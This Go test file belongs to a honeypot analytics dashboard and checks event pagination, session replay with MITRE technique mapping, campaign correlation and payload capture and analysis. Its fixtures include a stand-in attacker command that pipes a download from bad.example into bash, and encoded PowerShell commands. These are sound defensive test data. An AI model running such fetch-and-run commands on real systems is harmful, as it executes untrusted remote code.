package main

import (
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestEventPaginationAndAttackerProfile(t *testing.T) {
	s := &store{}
	for i := 0; i < 205; i++ {
		s.events = append(s.events, storedEvent{SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", Command: "id", Shasum: "abc", Time: "2026-07-22 01:00"})
	}
	request := httptest.NewRequest("GET", "/events?ip=203.0.113.9&page=2&per_page=100", nil)
	page := s.eventsData(request)
	if page.Page != 2 || page.Pages != 3 || page.From != 101 || page.To != 200 || len(page.Events) != 100 || page.PrevURL == "" || page.NextURL == "" {
		t.Fatalf("unexpected event page: %+v", page)
	}
	profile, ok := s.attackerData("203.0.113.9")
	if !ok || profile.Total != 205 || profile.Sessions != 1 || profile.PayloadCount != 205 || len(profile.Events) != 250 && len(profile.Events) != 205 {
		t.Fatalf("unexpected attacker profile: %+v", profile)
	}
}

func TestEventExplorerDefaultsToLazyWindow(t *testing.T) {
	s := &store{}
	for i := 0; i < 60; i++ {
		s.events = append(s.events, storedEvent{SrcIP: "203.0.113.10", Sensor: "cowrie"})
	}
	page := s.eventsData(httptest.NewRequest("GET", "/events", nil))
	if page.Total != 60 || len(page.Events) != 25 || page.PerPage != 25 ||
		page.Offset != 0 || page.RowsURL != "/api/event-rows" {
		t.Fatalf("unexpected initial lazy event window: %+v", page)
	}
	page = s.eventsData(httptest.NewRequest("GET", "/events?page=2", nil))
	if len(page.Events) != 25 || page.Offset != 25 || page.From != 26 || page.To != 50 {
		t.Fatalf("unexpected second event window: %+v", page)
	}
}

func TestSessionReplayAndTechniqueMapping(t *testing.T) {
	now := time.Now()
	s := &store{events: []storedEvent{
		{when: now, Time: now.Format(time.RFC3339), SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", Command: "curl http://bad.example/p | bash", Detail: "command"},
		{when: now.Add(-time.Minute), Time: now.Add(-time.Minute).Format(time.RFC3339), SrcIP: "203.0.113.9", Sensor: "cowrie", Session: "session-a", User: "root", Pass: "root", IsLogin: true, HasCredential: true, Detail: "login"},
	}}
	page, ok := s.sessionData("session-a")
	if !ok || page.Total != 2 || len(page.Commands) != 1 || len(page.Credentials) != 1 || len(page.Techniques) < 3 {
		t.Fatalf("incomplete session replay: %+v", page)
	}
	if page.Events[0].Detail != "login" || page.Events[1].Detail != "command" {
		t.Fatalf("session is not chronological: %+v", page.Events)
	}
	ids := map[string]bool{}
	for _, item := range page.Techniques {
		ids[item.ID] = true
	}
	for _, want := range []string{"T1110", "T1059.004", "T1105"} {
		if !ids[want] {
			t.Fatalf("missing technique %s: %+v", want, page.Techniques)
		}
	}
}

func TestInfrastructureClustersRequireSharedSources(t *testing.T) {
	s := &store{events: []storedEvent{
		{SrcIP: "8.8.8.8", Sensor: "cowrie", Fingerprint: "shared-hassh", ASN: 15169, Org: "Google"},
		{SrcIP: "8.8.4.4", Sensor: "dionaea", Fingerprint: "shared-hassh", ASN: 15169, Org: "Google"},
		{SrcIP: "1.1.1.1", Sensor: "cowrie", Fingerprint: "single"},
	}}
	page := s.clustersData()
	if len(page.Rows) < 2 {
		t.Fatalf("expected fingerprint and ASN clusters: %+v", page.Rows)
	}
	for _, row := range page.Rows {
		if row.Value == "single" {
			t.Fatalf("single-source value was clustered: %+v", row)
		}
	}
}

func TestPortbridgeIsCorrelationOnly(t *testing.T) {
	ev := classify(map[string]any{
		"sensor":   "portbridge",
		"event":    "connect",
		"src_ip":   "203.0.113.10",
		"via_port": float64(12345),
	}, "portbridge")
	if !ev.skip {
		t.Fatal("portbridge record was classified as a dashboard event")
	}
}

func TestBalancedRecentLimitsNoisySensor(t *testing.T) {
	evs := []storedEvent{
		{Sensor: "cowrie", Detail: "c1"},
		{Sensor: "cowrie", Detail: "c2"},
		{Sensor: "cowrie", Detail: "c3"},
		{Sensor: "dionaea", Detail: "d1"},
		{Sensor: "conpot", Detail: "p1"},
	}

	got := balancedRecent(evs, 4, 2)
	if len(got) != 4 {
		t.Fatalf("got %d rows, want 4", len(got))
	}
	want := []string{"c1", "c2", "d1", "p1"}
	for i := range want {
		if got[i].Detail != want[i] {
			t.Fatalf("row %d = %q, want %q", i, got[i].Detail, want[i])
		}
	}
}

func TestDionaeaIncidentIsNormalized(t *testing.T) {
	raw := map[string]any{
		"origin": "dionaea.download.complete",
		"data": map[string]any{
			"connection": map[string]any{
				"protocol":    "smbd",
				"remote_ip":   tunnelPeerIP,
				"remote_port": float64(45678),
				"local_port":  float64(445),
			},
			"path":   "/opt/dionaea/var/lib/dionaea/binaries/0123456789abcdef0123456789abcdef",
			"sha256": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		},
	}

	ev := classify(raw, "dionaea")
	if ev.skip || ev.sensor != "dionaea" || ev.proto != "smbd" || ev.port != "445" {
		t.Fatalf("unexpected normalized incident: %+v", ev)
	}
	if ev.shasum == "" || ev.download == "" {
		t.Fatalf("payload fields missing: %+v", ev)
	}
	if got := eventSrcPort(raw); got != 45678 {
		t.Fatalf("eventSrcPort = %d, want 45678", got)
	}
}

func TestConpotPersonaKeepsSensorIdentity(t *testing.T) {
	ev := classify(map[string]any{"data_type": "s7comm", "dst_port": float64(102)}, "conpot-s7-1500")
	if ev.sensor != "conpot-s7-1500" || ev.proto != "s7comm" || ev.port != "2102" {
		t.Fatalf("unexpected conpot persona: %+v", ev)
	}
}

func TestCampaignCorrelationByNetwork(t *testing.T) {
	now := time.Now()
	evs := []storedEvent{
		{when: now, SrcIP: "8.8.8.8", Sensor: "cowrie", Port: "22", User: "root", Pass: "root", IsLogin: true},
		{when: now.Add(-time.Minute), SrcIP: "8.8.8.9", Sensor: "conpot-s7-1200", Port: "1102", Alert: "S7 scan"},
		{when: now.Add(-8 * 24 * time.Hour), SrcIP: "8.8.8.10", Sensor: "cowrie", Port: "22"},
	}
	rows := correlateCampaigns(evs, now.Add(-7*24*time.Hour))
	if len(rows) != 1 {
		t.Fatalf("got %d campaigns, want 1", len(rows))
	}
	got := rows[0]
	if got.CIDR != "8.8.8.0/24" || got.Events != 2 || got.UniqueIPs != 2 || got.Creds != 1 || got.Alerts != 1 {
		t.Fatalf("unexpected campaign: %+v", got)
	}
	if !strings.Contains(got.Link, "cidr=8.8.8.0%2F24") {
		t.Fatalf("campaign link lacks CIDR filter: %s", got.Link)
	}
}

func TestFeedState(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		last time.Time
		want string
	}{{time.Time{}, "waiting"}, {now.Add(-time.Minute), "active"}, {now.Add(-time.Hour), "quiet"}, {now.Add(-48 * time.Hour), "stale"}} {
		if got := feedState(tc.last, now); got != tc.want {
			t.Fatalf("feedState(%v) = %q, want %q", tc.last, got, tc.want)
		}
	}
}

func TestAPIHoneypotKeepsSensorIdentity(t *testing.T) {
	ev := classify(map[string]any{
		"time": "2026-07-20T19:10:15Z", "sensor": "api-honeypot",
		"src_ip": "8.8.8.8", "method": "GET", "path": "/v1/models", "category": "llm-api",
	}, "api-honeypot")
	if ev.sensor != "api-honeypot" || ev.category != "llm-api" {
		t.Fatalf("unexpected API event: %+v", ev)
	}
}

func TestProviderClassification(t *testing.T) {
	if got := providerType("Amazon.com, Inc."); got != "cloud" {
		t.Fatalf("Amazon provider type = %q", got)
	}
	if got := providerType("Censys, Inc."); got != "scanner" {
		t.Fatalf("Censys provider type = %q", got)
	}
}

func TestDionaeaConnectionDeduplication(t *testing.T) {
	when := time.Unix(100, 0)
	a := event{sensor: "dionaea", ip: "8.8.8.8", port: "445", proto: "smb", detail: "connection.free", when: when}
	b := event{sensor: "dionaea", ip: "8.8.8.8", port: "445", proto: "smb", detail: "smb/tcp accept", when: when.Add(time.Second)}
	if dedupeKey(a) != dedupeKey(b) {
		t.Fatalf("equivalent Dionaea connection records were not deduplicated")
	}
}

func TestPayloadStaticAnalysis(t *testing.T) {
	dir := t.TempDir()
	name := strings.Repeat("a", 64)
	content := []byte("MZ.... powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABlAHMAdAAnAA== https%3A%2F%2Fexample.invalid")
	if err := os.WriteFile(filepath.Join(dir, name), content, 0o600); err != nil {
		t.Fatal(err)
	}
	a, err := (&store{payloadDirs: []string{dir}}).analyzePayload(name)
	if err != nil {
		t.Fatal(err)
	}
	if a.SHA256 == "" || a.Hexdump == "" || len(a.Decoded) == 0 {
		t.Fatalf("incomplete static analysis: %+v", a)
	}
}

func TestPayloadInventoryIncludesEverySourceAndNestedArtifact(t *testing.T) {
	root := t.TempDir()
	dionaea := filepath.Join(root, "dionaea", "binaries")
	cowrie := filepath.Join(root, "cowrie-downloads")
	scripts := filepath.Join(root, "script-payloads", "nested")
	for _, dir := range []string{dionaea, cowrie, scripts} {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	shared := strings.Repeat("a", 64)
	script := strings.Repeat("b", 64)
	for _, path := range []string{filepath.Join(dionaea, shared), filepath.Join(cowrie, shared), filepath.Join(scripts, script)} {
		if err := os.WriteFile(path, []byte(path), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	s := &store{payloadDirs: []string{dionaea, cowrie, filepath.Dir(scripts)}}
	s.payloadCache = s.scanPayloads()
	s.payloadCacheAt = time.Now()
	page := s.payloadsData("")
	if page.UniqueTotal != 2 || page.ResultTotal != 2 || len(page.Files) != 2 || len(page.Sources) != 3 {
		t.Fatalf("unexpected unified inventory: %+v", page)
	}
	for _, file := range page.Files {
		if file.Hash == shared && (file.Copies != 2 || strings.Join(file.Sources, ",") != "cowrie,dionaea") {
			t.Fatalf("shared payload did not retain both sources: %+v", file)
		}
	}
	filtered := s.payloadsData("cowrie")
	if filtered.ResultTotal != 1 || len(filtered.Files) != 1 || filtered.Files[0].Hash != shared {
		t.Fatalf("cowrie source filter returned the wrong artifacts: %+v", filtered.Files)
	}
	if path, err := s.payloadPath(script); err != nil || path != filepath.Join(scripts, script) {
		t.Fatalf("nested script payload is not downloadable: path=%q err=%v", path, err)
	}
}

func TestInlineScriptCapture(t *testing.T) {
	dir := t.TempDir()
	s := &store{scriptDir: dir, payloadDirs: []string{dir}}
	ev := event{sensor: "cowrie", command: `powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHAAcgBvAGIAZQA=`, detail: "cmd"}
	s.captureScriptPayload(&ev)
	if !hashName.MatchString(ev.shasum) || ev.download != "inline:powershell" {
		t.Fatalf("script was not captured: %+v", ev)
	}
	if _, err := os.Stat(filepath.Join(dir, ev.shasum)); err != nil {
		t.Fatalf("captured script missing: %v", err)
	}
	a, err := s.analyzePayload(ev.shasum)
	if err != nil || a.ScriptType != "PowerShell" || len(a.Decoded) == 0 || a.RiskScore == 0 || len(a.Rules) == 0 {
		t.Fatalf("script analysis incomplete: analysis=%+v err=%v", a, err)
	}
}

func TestCowrieHASSHFingerprint(t *testing.T) {
	ev := classify(map[string]any{
		"eventid": "cowrie.client.kex", "session": "63742cd576fd",
		"hassh": "f555226df1963d1d3c09daf865abdc9a", "protocol": "ssh",
	}, "cowrie")
	if ev.fingerprint != "f555226df1963d1d3c09daf865abdc9a" || ev.fingerKind != "HASSH" {
		t.Fatalf("HASSH was not normalized: %+v", ev)
	}
}

func TestFingerprintAndEnrichmentFilters(t *testing.T) {
	e := storedEvent{Fingerprint: "abc123", ASN: 64500, Org: "Example Networks", Provider: "hosting"}
	if !((filter{fingerprint: "abc123", asn: "AS64500", org: "Example Networks", provider: "hosting"}).match(e)) {
		t.Fatal("combined fingerprint/enrichment filter did not match")
	}
	if (filter{fingerprint: "different"}).match(e) {
		t.Fatal("different fingerprint unexpectedly matched")
	}
}

func TestFingerprintAndASNRowsLinkToExactEvents(t *testing.T) {
	fp := fingerprintRows(map[string]int{"HASSH\x00abc123": 4}, 10)
	if len(fp) != 1 || fp[0].Key != "HASSH: abc123" || fp[0].Link != "/events?fingerprint=abc123" {
		t.Fatalf("unexpected fingerprint row: %+v", fp)
	}
	asn := asnRows([]kv{{Key: "AS64500 Example Networks", Count: 3}})
	if len(asn) != 1 || asn[0].Link != "/events?asn=64500" {
		t.Fatalf("unexpected ASN row: %+v", asn)
	}
}

func TestMapPointsGeoJSON(t *testing.T) {
	got := mapPointsGeoJSON([]mapPoint{{IP: "203.0.113.7", Lat: 52.5, Lon: 13.4, ASN: 64500, Org: "Example Networks", Provider: "hosting", Count: 9}})
	if got.Type != "FeatureCollection" || len(got.Features) != 1 {
		t.Fatalf("unexpected GeoJSON collection: %+v", got)
	}
	f := got.Features[0]
	if f.Geometry.Type != "Point" || f.Geometry.Coordinates != [2]float64{13.4, 52.5} {
		t.Fatalf("GeoJSON coordinates must be longitude, latitude: %+v", f.Geometry)
	}
	if f.Properties.Events != "/investigate/ip/203.0.113.7" || f.Properties.Count != 9 || f.Properties.ASN != 64500 {
		t.Fatalf("incomplete map properties: %+v", f.Properties)
	}
}

func TestCredentialRankingRejectsCommandAndProtocolArtifacts(t *testing.T) {
	valid := [][2]string{{"root", "admin"}, {"DOMAIN\\operator", ""}, {"admin", "p@ss word"}}
	for _, pair := range valid {
		if !validCredentialPair(pair[0], pair[1]) {
			t.Fatalf("valid credential pair rejected: %#v", pair)
		}
	}
	invalid := [][2]string{
		{"enable\x00", "linuxshell\x00"},
		{"system", "/bin/busybox UNSTABLE"},
		{"sh", "powershell -enc AAAA"},
		{"bad user", "password"},
	}
	for _, pair := range invalid {
		if validCredentialPair(pair[0], pair[1]) {
			t.Fatalf("command/protocol artifact accepted as credentials: %#v", pair)
		}
	}
}

func TestCredentialRowsKeepExactFilterAndExplainEmptyValues(t *testing.T) {
	rows := credentialRows([]kv{{Key: "root / ", Count: 2}})
	if len(rows) != 1 || rows[0].Key != "root / (empty)" || rows[0].Link != "/events?cred=root+%2F+" {
		t.Fatalf("unexpected credential row: %+v", rows)
	}
}

func TestProtocolDisplayNormalization(t *testing.T) {
	cases := map[string]string{
		"smbd": "smb", "mssqld": "mssql", "mysqld": "mysql",
		"SipCall": "sip", "SipSession": "sip", "mongod": "mongodb", "pptpd": "pptp", "SSH": "ssh",
	}
	for input, want := range cases {
		if got := normalizeProtocol(input); got != want {
			t.Fatalf("normalizeProtocol(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestOverviewRecentExcludesInternalAndCaptureHealthNoise(t *testing.T) {
	if !isOverviewNoise(storedEvent{Sensor: "suricata", Alert: "SURICATA IPv4 truncated packet"}) {
		t.Fatal("capture-health alert should not occupy the overview feed")
	}
	for _, ip := range []string{tunnelPeerIP, "127.0.0.1", "::1"} {
		if !isOverviewNoise(storedEvent{Sensor: "cowrie", SrcIP: ip}) {
			t.Fatalf("internal source %q should not be presented as an attacker", ip)
		}
	}
	if isOverviewNoise(storedEvent{Sensor: "cowrie", SrcIP: "203.0.113.7"}) {
		t.Fatal("public attacker event was removed from the overview")
	}
}

func TestOperationalSuricataWarningsAreNotRankedAsAttacks(t *testing.T) {
	for _, signature := range []string{"SURICATA AF-PACKET truncated packet", "SURICATA IPv4 truncated packet"} {
		if !isOperationalAlert(signature) {
			t.Fatalf("operational warning not recognized: %q", signature)
		}
	}
	if isOperationalAlert("ET SCAN Possible Nmap User-Agent Observed") {
		t.Fatal("attacker detection was classified as an operational warning")
	}
}

func TestCompactTextKeepsShortValuesAndEllipsizesLongValues(t *testing.T) {
	if got := compactText("whoami", 12); got != "whoami" {
		t.Fatalf("short command changed: %q", got)
	}
	if got := compactText("abcdefghijklmnop", 8); got != "abcdefg…" {
		t.Fatalf("long command not compacted: %q", got)
	}
}

func TestAdminLTEAssetsAreEmbeddedAndReferenced(t *testing.T) {
	assets := map[string]int{
		"static/adminlte-4.1.0.min.css":         250000,
		"static/adminlte-4.1.0.min.js":          20000,
		"static/bootstrap-icons-1.13.1.min.css": 50000,
		"static/fonts/bootstrap-icons.woff":     100000,
		"static/fonts/bootstrap-icons.woff2":    100000,
		"static/hp-adminlte.css":                3000,
		"static/hp-adminlte.js":                 8000,
		"static/ADMINLTE-LICENSE.txt":           1000,
		"static/BOOTSTRAP-ICONS-LICENSE.txt":    1000,
	}
	for name, minimum := range assets {
		data, err := staticAssets.ReadFile(name)
		if err != nil {
			t.Fatalf("required dashboard asset %q is not embedded: %v", name, err)
		}
		if len(data) < minimum {
			t.Fatalf("dashboard asset %q is unexpectedly small: %d bytes", name, len(data))
		}
	}
	for _, reference := range []string{"/static/adminlte-4.1.0.min.css", "/static/adminlte-4.1.0.min.js", "/static/bootstrap-icons-1.13.1.min.css", "/static/hp-adminlte.css", "/static/hp-adminlte.js"} {
		if !strings.Contains(pageTemplate, reference) {
			t.Fatalf("shared page template does not load %q", reference)
		}
	}
	adapter, err := staticAssets.ReadFile("static/hp-adminlte.js")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(adapter), "window.replaceHoneypotPage = mountPage") {
		t.Fatal("AdminLTE adapter does not expose the live-refresh content mount")
	}
	if !strings.Contains(pageTemplate, `document.querySelector("[data-hp-page-content]")`) || !strings.Contains(pageTemplate, "window.replaceHoneypotPage(next)") {
		t.Fatal("dashboard refresh does not target the AdminLTE content container")
	}
}
